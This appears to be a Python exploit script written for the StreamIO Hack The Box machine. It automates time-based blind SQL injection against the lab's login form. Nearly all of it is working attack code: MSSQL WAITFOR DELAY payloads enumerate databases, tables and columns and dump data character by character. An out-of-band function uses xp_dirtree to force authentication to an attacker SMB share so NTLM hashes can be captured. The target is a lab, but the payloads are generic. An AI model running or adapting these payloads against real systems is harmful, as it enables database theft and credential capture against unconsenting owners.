#!/bin/env/python3
import requests, os, time, urllib, string, argparse, base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from pwn import *
from datetime import datetime

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# script just for fun and cuz sqlmap is slowly
# ASCII
letters = string.ascii_letters + string.digits  + string.punctuation + "£" 
letters_count = string.digits + ',' + "£"
letters_hex = string.hexdigits + ',' + "£"

# Site config
url = "https://streamio.htb/login.php"
proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
headers = {"Content-Type":"application/x-www-form-urlencoded"}
s = requests.Session()


def usage():
  file = __file__.rsplit('/', 1)[1]
  usage = "\n"
  usage += f"{file} [-h] [--dbs] [--tables] [--columns] [-d database] [-t table] [-c column]"
  usage += f"\n"
  usage += f"\nExamples:\n\t[+] Enumerate Databases\n\t{file} --dbs"
  usage += f"\n\t[+] Enumerate Tables\n\t{file} -d database --tables"
  usage += f"\n\t[+] Enumerate Columns\n\t{file} -d database -t table --columns"
  usage += f"\n\t[+] Dump Data\n\t{file} -d database -t table_name -c column_name"
  usage += f"\n\t[+] Dump Data\n\t{file} -d database -t table_name -c column_name -n"
  usage += f"\n\t[+] Dump Data\n\t{file} -d database -t table_name -c column_name -hex"
  usage += f"\n\t[+] Out-of-Band attack\n\t{file} -i IP -share share_name --oob"
  return usage

def arguments():
    parse = argparse.ArgumentParser(usage=usage())

    # info
    parse.add_argument('--dbs', action='store_true', help='Enumerate Databases')
    parse.add_argument('--tables', action='store_true', help='Enumerate Tables')
    parse.add_argument('--columns', action='store_true', help='Enumerate Columns')

    # dump 
    parse.add_argument('-d', dest='db', type=str, help='Name of database')
    parse.add_argument('-t', dest='table', type=str, help='Name of Table')
    parse.add_argument('-c', dest='column', type=str, help='Name of Column')

    # utils
    parse.add_argument('-n', action='store_true', help='Table as only numbers (faster), dump only')
    parse.add_argument('-hex', action='store_true', help='Table as only hex values (faster) dump only')

    # oob
    parse.add_argument('--oob', action='store_true', help='Out-of-Band')
    parse.add_argument('-i', dest='ip', type=str, help='IP address')
    parse.add_argument('-share', dest='share', type=str, help='Share name')

    return parse.parse_args()

"""
count dbs, tables, columns for iteration
"""
# used by dump
def count_dbs():
	# to see whats happening
	# p1 = log.progress("Payload")

	p2 = log.progress(f"Fetching number of Databases")
	result = ""

	# count(*) value =< 999 ( range(1-3) )
	for row_position in range(1, 4):
	    for letter in letters_count:
	        p = urllib.parse.quote(f"';IF(ISNULL(UNICODE(SUBSTRING(CAST(((SELECT CAST(COUNT(*) as varchar (10)) FROM master..sysdatabases)) AS varchar(100)),{row_position},1)),0)={ord(letter)}) WAITFOR DELAY '0:0:1'--")
	        payload = f"username=user{p}&password=pass"        
	        #p1.status(payload)        
	        try:                
	            time_before = time.monotonic()                
	            r = s.post(url, data=payload, headers=headers, verify=False)
	            time_after = time.monotonic()                

	            time.sleep(0.2) 
	            if time_after - time_before > 1: 
	                result += letter
	                #print(row_position, letter, ord(letter), (time_after-time_before))
	                p2.status(result)
	                break

	        except Exception as e:
	            print(e)
	            exit(1)

	    if letter == "£":
	        p2.success(result + " found.")
	        break

	#payload = "Done"
	#p1.success(payload)
	if not result:
		log.failure(f"Unable to retrieve number of Databases.")
		return False
	return result

# uselsess
def count_tables(database):
	# p1 --> to see whats happening
	# p1 = log.progress("Payload")
	p2 = log.progress(f"Number of Tables for '{database}'")
	result = ""

	# count(*) value =< 999 ( range(1-3) )
	for row_position in range(1, 4):
	    for letter in letters_count:
	        p = urllib.parse.quote(f"';USE {database};IF(ISNULL(UNICODE(SUBSTRING(CAST(((SELECT CAST(COUNT(*) as varchar (10)) FROM sys.tables)) AS varchar(100)),{row_position},1)),0)={ord(letter)}) WAITFOR DELAY '0:0:1'--")
	        payload = f"username=user{p}&password=pass"        
	        #p1.status(payload)        
	        try:                
	            time_before = time.monotonic()                
	            r = s.post(url, data = payload, headers = headers, verify=False)
	            time_after = time.monotonic()                

	            time.sleep(0.2) 
	            if time_after - time_before > 1: 
	                result += letter
	                #print(row_position, letter, ord(letter), (time_after-time_before))
	                p2.status(result)
	                break

	        except Exception as e:
	            print(e)
	            exit(1)

	    if letter == "£":
	        p2.success(result + " found.")
	        break

	#payload = "Done"
	#p1.success(payload)
	if not result:
		log.failure(f"Unable to retrieve number of tables for {database}.")
# uselsess
def count_columns(database, table):
	# to see whats happening
	#p1 = log.progress("Payload")
	p2 = log.progress(f"Number of Columns for '{table}' in DB '{database}'")
	result = ""

	# count(*) value =< 999 ( range(1-3) )
	for row_position in range(1, 4):
	    for letter in letters_count:
	        p = urllib.parse.quote(f"';USE {database};IF(ISNULL(UNICODE(SUBSTRING(CAST((( SELECT CAST(COUNT(*) as varchar (10)) FROM information_schema.columns WHERE table_name ='{table}')) AS varchar(100)),{row_position},1)),0)={ord(letter)}) WAITFOR DELAY '0:0:1'--")
	        payload = f"username=user{p}&password=pass"        
	        #p1.status(payload)        
	        try:                
	            time_before = time.monotonic()                
	            r = s.post(url, data = payload, headers = headers, verify=False)
	            time_after = time.monotonic()                

	            time.sleep(0.2) 
	            if time_after - time_before > 1: 
	                result += letter
	                #print(row_position, letter, ord(letter), (time_after-time_before))
	                p2.status(result)
	                break

	        except Exception as e:
	            print(e)
	            exit(1)

	    if letter == "£":
	        p2.success(result + " found.")
	        break

	#payload = "Done"
	#p1.success(payload)
	if not result:
		log.failure(f"Unable to retrieve number of columns in {table} for {database}.")

# used by dump_two
def count_rows(database, table):
	# p1 --> to see whats happening
	#p1 = log.progress("Payload")
	p2 = log.progress(f"Number of rows in '{table}' DB '{database}'")
	result = ""

	# count(*) value =< 999 ( range(1-3) )
	for row_position in range(1, 4):
	    for letter in letters_count:
	        p = urllib.parse.quote(f"';USE {database};IF(ISNULL(UNICODE(SUBSTRING(CAST((( SELECT CAST(COUNT(*) as varchar (10)) FROM {table})) AS varchar(100)),{row_position},1)),0)={ord(letter)}) WAITFOR DELAY '0:0:1'--")
	        payload = f"username=user{p}&password=pass"
	        #p1.status(payload)
	        try:                
	            time_before = time.monotonic()                
	            r = s.post(url, data = payload, headers = headers, verify=False)
	            time_after = time.monotonic()                

	            time.sleep(0.2) 
	            if time_after - time_before > 1: 
	                result += letter
	                #print(row_position, letter, ord(letter), (time_after-time_before))
	                p2.status(result)
	                break

	        except Exception as e:
	            print(e)
	            exit(1)

	    if letter == "£":
	        p2.success(result + f" entries found.")
	        #print("unrandom")
	        break

	#payload = "Done"
	#p1.success(payload)
	if not result:
		log.failure(f"Unable to retrieve number of rows in {table} for {database}.")

	return int(result)

"""
Enumerate & dump data
"""
def get_dbs():
	# to see what's happening
	# p1 = log.progress("Payload")

	# Here we get number of dbs from count_dbs()
	n_dbs = int(count_dbs())
	if n_dbs:
		pass
	else:
		log.failure("Unable to retrieve number of dbs.")
		exit(1)

	for row in range(1, n_dbs+1):
	    p2 = log.progress(f"Fetching Databases ({row})")
	    result = ""	    
	    
	    # name with at least 50 chars 
	    for row_position in range(1, 50):
	        for letter in letters:
	            # get DB name using db_name()
	            p = urllib.parse.quote(f"';IF(ISNULL(UNICODE(SUBSTRING(CAST((SELECT LOWER(db_name({row})) )AS varchar(8000)),{row_position},1)),0)={ord(letter)}) WAITFOR DELAY '0:0:1'--")
	            payload = f"username=user{p}&password=pass"
	            # p1.status(payload)
	            try:                
	                time_before = time.monotonic()                
	                r = s.post(url, data = payload, headers = headers, verify=False)
	                time_after = time.monotonic()                

	                time.sleep(0.2) 
	                if time_after - time_before > 1: 
	                    result += letter
	                    # print(row_position, letter, ord(letter), (time_after-time_before))
	                    p2.status(result)
	                    break

	            except Exception as e:
	                print(e)
	                exit(1)

	        if letter == "£":
	            p2.success(result)
	            break

	# payload = "Done"
	# p1.success(payload)
	if not result:
		log.failure(f"Unable to retrieve database names.")

def get_tables(database):
	# p1 --> to see whats happening
	#p1 = log.progress("Payload")
	p2 = log.progress(f"Fetching tables in '{database}'")
	result = ""

	# row len could be > 1k lenght since we are using STRING_AGG() to concat every value
	for row_position in range(1, 1500):
	    for letter in letters:
	        p = urllib.parse.quote(f"';USE {database};IF(ISNULL(UNICODE(SUBSTRING(CAST((( SELECT STRING_AGG(CONVERT(NVARCHAR(max), ISNULL(name,'N/A')), ',') FROM sys.tables )) AS varchar(800)),{row_position},1)),0)={ord(letter)}) WAITFOR DELAY '0:0:1'--")
	        payload = f"username=user{p}&password=pass"        
	        #p1.status(payload)        
	        try:
	            time_before = time.monotonic()                
	            r = s.post(url, data=payload, headers=headers, verify=False)
	            time_after = time.monotonic()                

	            time.sleep(0.2) 
	            if time_after - time_before > 1: 
	                result += letter
	                #print(row_position, letter, ord(letter), (time_after-time_before))
	                p2.status(result)
	                break

	        except Exception as e:
	            print(e)
	            exit(1)

	    if letter == "£":
	    	p2.success('\n\t[+] ' + '\n\t[+] '.join(result.split(',')))
	    	# p2.success(result + " found.")
	    	break

	#payload = "Done"
	#p1.success(payload)
	if not result:
		log.failure(f"Unable to retrieve number of tables for {database}.")

def get_columns(database, table):
	# to see whats happening
	# p1 = log.progress("Payload")
	p2 = log.progress(f"Fetching columns of '{table}' in '{database}'")
	result = ""

	# row len could be > 1k lenght since we are using STRING_AGG() to concat every value
	for row_position in range(1, 1400):
	    for letter in letters:
	        p = urllib.parse.quote(f"';USE {database};IF(ISNULL(UNICODE(SUBSTRING(CAST((( SELECT STRING_AGG(CONVERT(NVARCHAR(max), ISNULL(column_name,'N/A')), ',') FROM information_schema.columns WHERE table_name ='{table}' )) AS varchar(800)),{row_position},1)),0)={ord(letter)}) WAITFOR DELAY '0:0:1'--")
	        payload = f"username=user{p}&password=pass"        
	        #p1.status(payload)        
	        try:
	            time_before = time.monotonic()                
	            r = s.post(url, data = payload, headers = headers, verify=False)
	            time_after = time.monotonic()                

	            time.sleep(0.2) 
	            if time_after - time_before > 1: 
	                result += letter
	                #print(row_position, letter, ord(letter), (time_after-time_before))
	                p2.status(result)
	                break

	        except Exception as e:
	            print(e)
	            exit(1)

	    if letter == "£":
	    	p2.success('\n\t[+] ' + '\n\t[+] '.join(result.split(',')))
	    	# p2.success(result + " found.")
	    	break

	#payload = "Done"
	#p1.success(payload)
	if not result:
		log.failure(f"Unable to retrieve Columns of {table} for {database}.")

'''
dumps data using STRING_AGG
uses a large string and gets everything at once 
'''
def dump(database, table, column, utils):
	# to see whats happening
	# p1 = log.progress("Payload")
	p2 = log.progress(f"Dump data in '{column}' of '{table}' in '{database}'")
	result = ""

	
	global letters
	# Utils numbers or hex values
	if utils == 'n':		
		letters = letters_count
		print(letters)
	elif utils == 'hex':
		letters = letters_hex
		print(letters)
	else:
		print(letters)

	# row len could be > 2k lenght since we are using STRING_AGG() to concat every value
	for row_position in range(1, 2500):
	    for letter in letters:
	        p = urllib.parse.quote(f"';USE {database};IF(ISNULL(UNICODE(SUBSTRING(CAST((( SELECT STRING_AGG(CONVERT(NVARCHAR(max), ISNULL(LOWER(REPLACE({column}, ' ','')),'N/A')), ',') FROM {table} )) AS varchar(800)),{row_position},1)),0)={ord(letter)}) WAITFOR DELAY '0:0:1'--")
	        payload = f"username=user{p}&password=pass"        
	        #p1.status(payload)        
	        try:
	            time_before = time.monotonic()                
	            r = s.post(url, data = payload, headers = headers, verify = False)
	            time_after = time.monotonic()                

	            time.sleep(0.2) 
	            if time_after - time_before > 1: 
	                result += letter
	                #print(row_position, letter, ord(letter), (time_after-time_before))
	                p2.status(result)
	                break

	        except Exception as e:
	            print(e)
	            exit(1)

	    if letter == "£":
	    	p2.success('\n\t[+] ' + '\n\t[+] '.join(result.split(',')))
	    	# p2.success(result + " found.")
	    	break

	#payload = "Done"
	#p1.success(payload)
	if not result:
		log.failure(f"Unable to retrieve data of {table} ({database}).")

'''
dumps data by row using OFFSET and FETCH (LIMIT like)
gets data row by row and preservs
'''
def dump_two(database, table, column, utils):
	# to see whats happening
	# p1 = log.progress("Payload")

	rows = count_rows(database, table)
	if rows:
		log.info(f"{rows} entries found on {table}.")
		#print(rows)
	else:
		exit(1)
	
	global letters
	# Utils numbers or hex values
	if utils == 'n':		
		letters = letters_count
		#print(letters)
	elif utils == 'hex':
		letters = letters_hex
		#print(letters)
	else:
		pass
		#print(letters)

	for row in range(0, rows+1):
		p2 = log.progress(f"Dump data in '{column}' of '{table}' in '{database}' row ({row+1})")
		result = ""
		# row len could be > 200 lenght
		for row_position in range(1, 200):
		    for letter in letters:
		    	# try to remove database
		        p = urllib.parse.quote(f"';USE {database};IF(ISNULL(UNICODE(SUBSTRING(CAST((SELECT {column} FROM {database}.dbo.{table} ORDER BY id OFFSET {row} ROWS FETCH NEXT 1 ROWS ONLY) AS varchar(100)),{row_position},1)),0)={ord(letter)}) WAITFOR DELAY '0:0:1'--")
		        payload = f"username=user{p}&password=pass"        
		        #p1.status(letter)        
		        try:
		            time_before = time.monotonic()                
		            r = s.post(url, data = payload, headers = headers, verify = False)
		            time_after = time.monotonic()                

		            time.sleep(0.2) 
		            if time_after - time_before > 1: 
		                result += letter
		                #print(row_position, letter, ord(letter), (time_after-time_before))
		                p2.status(result)
		                break

		        except Exception as e:
		            print(e)
		            exit(1)

		    if letter == "£":
		    	p2.success(result + " ✓")
		    	break

	#payload = "Done"
	#p1.success(payload)
	if not result:
		log.failure(f"Unable to retrieve data of {table} ({database}).")

"""
Out-of-band attack
"""
def exec_sql(ip, share):
	log.info("Out-of-Band attack")
	log.info("You can use responder or smbserver to capture NTLM Hash")
	log.info("> responder -I <htb-interface>")
	log.info("> impacket-smbserver -smb2support -port 445 [share_name] [path-folder]")
	log.info('')
	time.sleep(1)
	p2 = log.progress(f"Trying to execute")
	# xp_dirtree
	p = urllib.parse.quote(f"';EXEC master.dbo.xp_dirtree '\\\\{ip}\\{share}' WAITFOR DELAY '0:0:4'--")	
	payload = f"username=user{p}&password=pass"
	try:                
		time_before = time.monotonic()                
		r = s.post(url, data = payload, headers = headers, verify=False)
		time_after = time.monotonic()
		time.sleep(1) 
		if time_after - time_before > 4:            
			p2.status("check if command has been executed")
	except Exception as e:
		print(e)
		exit(1)

if __name__ == '__main__':
	print("""\
 __  ___  __   ___               __  
/__`  |  |__) |__   /\   |\/| | /  \ 
.__/  |  |  \ |___ /~~\  |  | | \__/ """)

	print("\033[91mTime-based Blind SQL Injection on StreamIO · sckull\033[0m")

	# Different payload
	# dump_two('streamio','users','username','')
	
	if len(sys.argv) == 1:
	    print(usage())
	    sys.exit(1)	

	args = arguments()
	if (args.dbs):
		# Enumerate dbs
		get_dbs()

	elif(args.db and args.tables):
		# Enumerate tables of db
		get_tables(args.db)

	elif(args.db and args.table and args.columns):
		# Enumerate columns in table of db
		get_columns(args.db, args.table)

	elif(args.n and args.db and args.table and args.column ):
		# dump data -> column.table.db (using numbers only)
		dump_two(args.db, args.table, args.column, 'n')

	elif(args.db and args.table and args.column and args.hex):
		# dump data -> column.table.db (using hex values only)
		dump_two(args.db, args.table, args.column, 'hex')

	elif(args.db and args.table and args.column):
		# dump data -> column.table.db
		dump_two(args.db, args.table, args.column, '')

	elif(args.oob and args.ip and args.share):
		# oob attack
		exec_sql(args.ip, args.share)